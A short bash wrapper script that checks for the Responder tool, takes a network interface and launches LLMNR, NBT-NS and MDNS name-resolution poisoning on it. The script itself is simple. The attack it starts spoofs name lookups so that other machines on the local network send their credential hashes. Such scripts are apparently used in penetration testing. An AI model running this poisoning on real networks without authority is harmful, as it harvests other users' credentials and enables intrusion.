#!/bin/bash
# Responder - LLMNR, NBT-NS, and MDNS Poisoner
# Options:
# -I : Interface to use

# Usage: responder.sh <interface>
# Example script
# responder.sh eth0

# Check if responder is installed
if ! command -v responder &> /dev/null
then
    echo "responder could not be found, please install it first."
    exit
fi

# Ensure interface is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <interface>"
    exit 1
fi

INTERFACE=$1

echo "Starting Responder on interface $INTERFACE"

# Perform LLMNR, NBT-NS, and MDNS poisoning
responder -I $INTERFACE

echo "Responder poisoning completed."
